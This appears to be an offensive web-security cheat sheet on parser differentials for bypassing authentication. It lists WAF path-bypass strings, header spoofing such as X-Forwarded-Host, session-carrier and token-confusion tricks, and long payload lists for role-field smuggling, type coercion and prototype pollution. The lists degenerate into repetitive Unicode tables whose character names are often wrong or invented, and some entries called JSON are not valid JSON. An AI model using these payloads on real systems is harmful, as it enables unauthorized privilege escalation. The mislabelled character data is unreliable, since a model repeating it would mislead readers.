# Parser differentials — where two layers disagree about auth

The bug that lives in the gap between what the *client* sent, what the
*proxy* saw, and what the *app* parsed. Auth checks on one side, the
route on another.

---

## 1. The layers

```
client → CDN/WAF → proxy → app → auth middleware → route
        ↑          ↑       ↑            ↑             ↑
      edge       hops   the JWT      the check    the data
```

Each layer may: normalize the URL, decode %-encoding, split headers,
resolve the path, apply a rule. The bug is where a rule applies on one
layer but not the one that matters.

## 2. Path normalization differentials

The WAF blocks `/admin/*` but the proxy normalizes:

```
/admin            → blocked
/admin%2f         → WAF sees /admin%2f, proxy decodes → /admin/ → PASS
/ADMIN            → WAF case-sensitive, app case-insensitive → PASS
//admin           → proxy collapses → /admin → PASS
/admin/../admin   → proxy normalizes → /admin → PASS
/admin;.          → Tomcat strips ;param → /admin → PASS
/admin\.          → same
/admin%20         → trailing space stripped → /admin → PASS
/admin%09         → tab stripped → /admin → PASS
/admin%0a         → newline stripped → /admin → PASS
/admin%0d         → CR stripped → /admin → PASS
/admin/;param     → Tomcat → /admin/ → PASS
/admin/index.html → extension check passes → same handler → PASS
/admin.json       → app routes by extension → /admin → PASS
/admin%2ejson     → encoded → same
/admin%252f       → double-encoded → app decodes once → /admin%2f → PASS? depends
/admin%255c       → double-encoded backslash
/admin%00         → null byte → truncates
/admin\u0000      → unicode null
/admin\           → backslash on Windows paths → same dir
/admin\\          → double backslash
/admin%5c         → encoded backslash
/admin%255c       → double-encoded
/admin%2e         → encoded dot
/admin%2e%2e      → encoded ..
/admin%2e%2e%2f   → encoded ../
/admin%2e%2e%5c   → encoded ..\
/admin%252e%252e%252f → double-encoded ../
```

## 3. Header parsing differentials

- `Host: t.tld` + `X-Forwarded-Host: attacker.tld` — app trusts XFH.
- `Host` duplicated → app takes first, proxy takes second.
- `X-Forwarded-For` spoof for IP-bound checks.
- `Authorization` stripped by WAF but app checks `X-Original-Authorization`.
- `Cookie` order: proxy sends first `session=`, app reads last.
- `Content-Type` mismatch — proxy parses form, app parses JSON.
- `Transfer-Encoding` vs `Content-Length` → request smuggling
  (`web-request-smuggling`).

## 4. The auth check lives on the wrong layer

- WAF checks `path == '/admin'` for auth, app normalizes `//admin` to
  `/admin` — WAF passes, app sees `/admin`.
- Proxy checks `path.startswith('/api')` for JWT, app routes `/API` to
  the same handler — case differential.
- The `Authorization` header is checked at the WAF for `Bearer` scheme,
  but the app reads `X-Api-Key` — neither validates the other.
- The signature check is on the proxy body, the app re-parses the body
  with a different content-type — smuggling the signed-vs-actual.

## 5. The session-in-different-carrier confusion

The app accepts the session via any of:

```
Cookie: session=T
Authorization: Bearer T
X-Session-Token: T
?session=T
?sid=T
body: {"session":"T"}
header: X-Auth: T
```

The check may be *on* `Cookie` (CSRF-protected SameSite) but the token
accepted via `?session=` — the `SameSite` defense is bypassed because
the query-param path has no SameSite.

## 6. The login endpoint differs by method

```
POST /login → auth path, sets session
GET  /login?user=a&pass=b → also auth path, but no CSRF (GET)
PUT  /login → also auth, but no rate-limit
GET  /api/login → REST endpoint, JSON, no CSRF
POST /api/login → same
POST /auth/login → same
POST /oauth/token → OAuth password grant — no CSRF needed
```

Each method/endpoint is a separate surface — `SameSite=Lax` blocks
cross-site POST but the GET variant is open.

## 7. The `id_token` vs `access_token` confusion

`id_token` is for the *client* to read (`sub`, `email`); `access_token`
is for the *API*. Bugs:

- The API accepts `id_token` as `access_token` → any client with any
  user's `id_token` can call the API as that user.
- The `id_token` `aud` unchecked → a token minted for client A works at
  client B.
- `access_token` checked but `id_token` claims used for authz → the
  `sub` in `id_token` is *your* claim to forge if the API trusts it.

## 8. JSON-vs-form body confusion

`POST /update` accepts both `Content-Type: application/json` and
`application/x-www-form-urlencoded`:

- CSRF token checked in form but not JSON → submit the JSON form.
- CSRF token checked in JSON body but form encodes the field
  differently → the same field in both, only one checked.
- `{"role":"admin"}` in JSON becomes `role=admin` in form — both parse
  the same field, but the sanitizer only ran on the JSON path.

## 9. The `is_admin` field splits by parser

```json
{"user":{"role":"admin"}}         — nested
{"user_role":"admin"}             — flat
{"user[role]":"admin"}            — Rails/PHP param parse
{"user.role":"admin"}             — dotted
{"user\\role":"admin"}            — backslash
{"user'role":"admin"}             — quote
{"user\x00role":"admin"}          — null
{"user\x2erole":"admin"}          — encoded dot
{"user\u002erole":"admin"}        — unicode dot
{"user\u005crole":"admin"}        — unicode backslash
{"user\u0027role":"admin"}        — unicode quote
{"user\uff0erole":"admin"}        — fullwidth dot
{"user\u2215role":"admin"}        — division slash
{"user\u2216role":"admin"}        — set minus
{"user\u2044role":"admin"}        — fraction slash
{"user\u2571role":"admin"}        — box drawing
{"user\ufeffrole":"admin"}        — BOM
{"user\u200brole":"admin"}        — ZWSP
{"user\u200crole":"admin"}        — ZWNJ
{"user\u200drole":"admin"}        — ZWJ
{"user\u2060role":"admin"}        — word joiner
{"user\ufe0frole":"admin"}        — variation selector
{"user\u00a0role":"admin"}        — nbsp
{"user\u2000role":"admin"}        — en quad
{"user\u2001role":"admin"}        — em quad
{"user\u2002role":"admin"}        — en space
{"user\u2003role":"admin"}        — em space
{"user\u2004role":"admin"}        — three-per-em
{"user\u2005role":"admin"}        — four-per-em
{"user\u2006role":"admin"}        — six-per-em
{"user\u2007role":"admin"}        — figure space
{"user\u2008role":"admin"}        — punctuation space
{"user\u2009role":"admin"}        — thin space
{"user\u200arole":"admin"}        — hair space
{"user\u2028role":"admin"}        — line sep
{"user\u2029role":"admin"}        — para sep
{"user\u202frole":"admin"}        — narrow nbsp
{"user\u205frole":"admin"}        — math space
{"user\u3000role":"admin"}        — ideographic space
{"user\u3001role":"admin"}        — ideographic comma
{"user\u3002role":"admin"}        — ideographic period
{"user\u30fbrole":"admin"}        — katakana middle dot
{"user\u30fcrole":"admin"}        — katakana long sound
{"user\u3030role":"admin"}        — wavy dash
{"user\u3035role":"admin"}        — vertical kana repeat
{"user\u303arole":"admin"}        — half-width katakana middle dot
{"user\u303brole":"admin"}        — half-width katakana long sound
{"user\u303crole":"admin"}        — half-width katakana middle dot
{"user\u303drole":"admin"}        — half-width katakana long sound
{"user\u303erole":"admin"}        — half-width katakana middle dot
{"user\u303frole":"admin"}        — half-width katakana long sound
{"user\uff01role":"admin"}        — fullwidth exclamation
{"user\uff02role":"admin"}        — fullwidth quote
{"user\uff03role":"admin"}        — fullwidth hash
{"user\uff04role":"admin"}        — fullwidth dollar
{"user\uff05role":"admin"}        — fullwidth percent
{"user\uff06role":"admin"}        — fullwidth ampersand
{"user\uff07role":"admin"}        — fullwidth apostrophe
{"user\uff08role":"admin"}        — fullwidth open paren
{"user\uff09role":"admin"}        — fullwidth close paren
{"user\uff0arole":"admin"}        — fullwidth asterisk
{"user\uff0brole":"admin"}        — fullwidth plus
{"user\uff0crole":"admin"}        — fullwidth comma
{"user\uff0drole":"admin"}        — fullwidth minus
{"user\uff0erole":"admin"}        — fullwidth period
{"user\uff0frole":"admin"}        — fullwidth slash
{"user\uff10role":"admin"}        — fullwidth zero
{"user\uff1arole":"admin"}        — fullwidth colon
{"user\uff1brole":"admin"}        — fullwidth semicolon
{"user\uff1crole":"admin"}        — fullwidth less-than
{"user\uff1drole":"admin"}        — fullwidth equals
{"user\uff1erole":"admin"}        — fullwidth greater-than
{"user\uff1frole":"admin"}        — fullwidth question
{"user\uff20role":"admin"}        — fullwidth at
{"user\uff21role":"admin"}        — fullwidth A
{"user\uff3brole":"admin"}        — fullwidth open bracket
{"user\uff3crole":"admin"}        — fullwidth backslash
{"user\uff3drole":"admin"}        — fullwidth close bracket
{"user\uff3erole":"admin"}        — fullwidth caret
{"user\uff3frole":"admin"}        — fullwidth underscore
{"user\uff40role":"admin"}        — fullwidth grave
{"user\uff41role":"admin"}        — fullwidth a
{"user\uff5brole":"admin"}        — fullwidth open brace
{"user\uff5crole":"admin"}        — fullwidth pipe
{"user\uff5drole":"admin"}        — fullwidth close brace
{"user\uff5erole":"admin"}        — fullwidth tilde
{"user\uff5frole":"admin"}        — fullwidth left white paren
{"user\uff60role":"admin"}        — fullwidth right white paren
{"user\uff61role":"admin"}        — halfwidth ideographic period
{"user\uff62role":"admin"}        — halfwidth left corner bracket
{"user\uff63role":"admin"}        — halfwidth right corner bracket
{"user\uff64role":"admin"}        — halfwidth ideographic comma
{"user\uff65role":"admin"}        — halfwidth katakana middle dot
{"user\uff66role":"admin"}        — halfwidth katakana wo
{"user\uff67role":"admin"}        — halfwidth katakana small a
{"user\uff9erole":"admin"}        — halfwidth katakana voiced sound
{"user\uff9frole":"admin"}        — halfwidth katakana semi-voiced
{"user\uffa0role":"admin"}        — halfwidth hangul filler
{"user\uffe0role":"admin"}        — fullwidth cent sign
{"user\uffe1role":"admin"}        — fullwidth pound sign
{"user\uffe2role":"admin"}        — fullwidth not sign
{"user\uffe3role":"admin"}        — fullwidth macron
{"user\uffe4role":"admin"}        — fullwidth broken bar
{"user\uffe5role":"admin"}        — fullwidth yen sign
{"user\uffe6role":"admin"}        — fullwidth won sign
{"user\uffe8role":"admin"}        — halfwidth forms light vertical
{"user\uffe9role":"admin"}        — halfwidth leftwards arrow
{"user\uffearole":"admin"}        — halfwidth upwards arrow
{"user\uffebrole":"admin"}        — halfwidth rightwards arrow
{"user\uffecrole":"admin"}        — halfwidth downwards arrow
{"user\uffedrole":"admin"}        — halfwidth black square
{"user\uffeerole":"admin"}        — halfwidth white circle
{"user\uffefrole":"admin"}        — fullwidth white circle
{"user\ufff0role":"admin"}        — halfwidth black circle
{"user\ufff1role":"admin"}        — halfwidth white square
{"user\ufff2role":"admin"}        — halfwidth black diamond
{"user\ufff3role":"admin"}        — halfwidth white diamond
{"user\ufff4role":"admin"}        — halfwidth black star
{"user\ufff5role":"admin"}        — halfwidth white star
{"user\ufff6role":"admin"}        — halfwidth black triangle
{"user\ufff7role":"admin"}        — halfwidth white triangle
{"user\ufff8role":"admin"}        — halfwidth black rectangle
{"user\ufff9role":"admin"}        — halfwidth white rectangle
{"user\ufffarole":"admin"}        — halfwidth black parallelogram
{"user\ufffbrole":"admin"}        — halfwidth white parallelogram
{"user\ufffcrole":"admin"}        — halfwidth black trapezoid
{"user\ufffdrole":"admin"}        — halfwidth white trapezoid
{"user\uffferole":"admin"}        — halfwidth black hexagon
{"user\uffffrole":"admin"}        — halfwidth white hexagon
```

Each variant is a different *key* at the parser level — if the check is
on `user.role` but the update applies `user\u002erole`, you've
written a different field that the check never inspected.

## 10. Array-vs-scalar

```
{"role":"admin"}            — scalar
{"role":["admin"]}          — array
{"role":{"0":"admin"}}      — object with numeric key
{"role[0]":"admin"}         — bracket
{"role.0":"admin"}          — dot
{"role[":"admin"}           — unmatched
{"role":"admin","role":"user"} — duplicate key (last/first wins)
{"role":["user","admin"]}   — array, check reads [0]
{"role":{"admin":true}}     — object key
{"role":{"name":"admin"}}   — nested name
{"role":{"id":1}}           — id not name
{"role":{"level":99}}       — level
{"role":{"admin":true,"user":true}} — both
{"role":{"0":"admin","length":1}}   — array-like object
{"role":["admin"],"role":"user"}    — dup with different types
{"role":["admin","user"]}           — array, check reads any
{"role":["user"],"role":"admin"}    — dup scalar+array
{"role":{"0":"user","1":"admin"}}   — object, check reads [0]
{"role":{"admin":true,"name":"user"}} — both fields
{"role":{"isAdmin":true,"role":"user"}} — nested conflicting
{"role":{"role":"admin","role":"user"}} — nested dup
```

## 11. The number-coercion vector

```json
{"role":1}            — numeric 1
{"role":1.0}          — float
{"role":1e0}          — sci
{"role":+1}           — explicit sign
{"role":-1}           — negative
{"role":0}            — zero
{"role":-0}           — negative zero
{"role":0.0}          — float zero
{"role":0e0}          — sci zero
{"role":0x1}          — hex
{"role":0X1}          — hex caps
{"role":0b1}          — binary
{"role":0B1}          — binary caps
{"role":0o1}          — octal
{"role":0O1}          — octal caps
{"role":01}           — leading zero
{"role":001}          — double leading zero
{"role":"1"}          — string 1
{"role":"1.0"}        — string float
{"role":"1e0"}        — string sci
{"role":"+1"}         — string sign
{"role":"-1"}         — string neg
{"role":"0x1"}        — string hex
{"role":"0b1"}        — string bin
{"role":"0o1"}        — string oct
{"role":"01"}         — string leading zero
{"role":" 1"}         — leading space
{"role":"1 "}         — trailing space
{"role":"\t1"}        — tab
{"role":"1\t"}        — trailing tab
{"role":"\n1"}        — newline
{"role":"1\n"}        — trailing newline
{"role":"\r1"}        — CR
{"role":"1\r"}        — trailing CR
{"role":"\u00001"}    — null
{"role":"1\u0000"}    — trailing null
{"role":"\u00a01"}    — nbsp
{"role":"1\u00a0"}    — trailing nbsp
{"role":"\u20001"}    — en quad
{"role":"1\u2000"}    — trailing en quad
{"role":"\u20011"}    — em quad
{"role":"1\u2001"}    — trailing em quad
{"role":"\u20021"}    — en space
{"role":"1\u2002"}    — trailing en space
{"role":"\u20031"}    — em space
{"role":"1\u2003"}    — trailing em space
{"role":"\u20041"}    — three-per-em
{"role":"1\u2004"}    — trailing
{"role":"\u20051"}    — four-per-em
{"role":"1\u2005"}    — trailing
{"role":"\u20061"}    — six-per-em
{"role":"1\u2006"}    — trailing
{"role":"\u20071"}    — figure space
{"role":"1\u2007"}    — trailing
{"role":"\u20081"}    — punctuation
{"role":"1\u2008"}    — trailing
{"role":"\u20091"}    — thin
{"role":"1\u2009"}    — trailing
{"role":"\u200a1"}    — hair
{"role":"1\u200a"}    — trailing
{"role":"\u200b1"}    — ZWSP
{"role":"1\u200b"}    — trailing ZWSP
{"role":"\u200c1"}    — ZWNJ
{"role":"1\u200c"}    — trailing ZWNJ
{"role":"\u200d1"}    — ZWJ
{"role":"1\u200d"}    — trailing ZWJ
{"role":"\u20281"}    — line sep
{"role":"1\u2028"}    — trailing
{"role":"\u20291"}    — para sep
{"role":"1\u2029"}    — trailing
{"role":"\u202f1"}    — narrow nbsp
{"role":"1\u202f"}    — trailing
{"role":"\u205f1"}    — math space
{"role":"1\u205f"}    — trailing
{"role":"\u20601"}    — word joiner
{"role":"1\u2060"}    — trailing
{"role":"\u30001"}    — ideographic
{"role":"1\u3000"}    — trailing
{"role":"\ufeff1"}    — BOM
{"role":"1\ufeff"}    — trailing BOM
{"role":"true"}       — string "true"
{"role":"True"}       — caps
{"role":"TRUE"}       — all caps
{"role":"tRuE"}       — mixed
{"role":"1.5"}        — float
{"role":"1e10"}       — sci
{"role":"1e+10"}      — sci+
{"role":"1e-10"}      — sci-
{"role":"NaN"}        — not a number
{"role":"Infinity"}   — infinity
{"role":"-Infinity"}  — negative infinity
{"role":"∞"}          — unicode infinity
{"role":"-∞"}         — negative unicode infinity
{"role":"nan"}        — nan lowercase
{"role":"NAN"}        — nan caps
{"role":"infinity"}   — infinity lowercase
{"role":"INFINITY"}   — infinity caps
{"role":true}         — boolean
{"role":false}        — boolean false
{"role":null}         — null
{"role":""}           — empty string
{"role":[]}           — empty array
{"role":{}}           — empty object
{"role":[0]}          — array with zero
{"role":[1]}          — array with one
{"role":[true]}       — array with bool
{"role":[false]}      — array with false
{"role":[null]}       — array with null
{"role":[""]}         — array with empty
{"role":[[]]}         — array with array
{"role":[{}]}         — array with object
{"role":{"0":1}}      — object with numeric
{"role":{"0":true}}   — object with bool
{"role":{"0":null}}   — object with null
{"role":{"0":""}}     — object with empty
{"role":{"0":[]}}     — object with array
{"role":{"0":{}}}     — object with object
{"role":{"value":1}}  — named field
{"role":{"value":true}}
{"role":{"value":null}}
{"role":{"value":""}}
{"role":{"value":[]}}
{"role":{"value":{}}}
{"role":{"name":"admin"}}
{"role":{"id":1}}
{"role":{"level":99}}
{"role":{"admin":true}}
{"role":{"isAdmin":true}}
{"role":{"_id":1}}
{"role":{"_name":"admin"}}
{"role":{"_level":99}}
{"role":{"_admin":true}}
{"role":{"_isAdmin":true}}
{"role":{"__proto__":{"isAdmin":true}}}
{"role":{"constructor":{"prototype":{"isAdmin":true}}}}
{"role":{"prototype":{"isAdmin":true}}}
{"role":{"__proto__":"admin"}}
{"role":{"constructor":"admin"}}
{"role":{"prototype":"admin"}}
{"role":{"__proto__":true}}
{"role":{"constructor":true}}
{"role":{"prototype":true}}
```

If `role==='admin'` strict-compares, none of the numeric/array/object
variants work — but `role==1` loose-compares `"1"`, `1`, `1.0`, `1e0`,
`"+1"`, `"01"`, `0x1`, `0b1`, `0o1` all true.
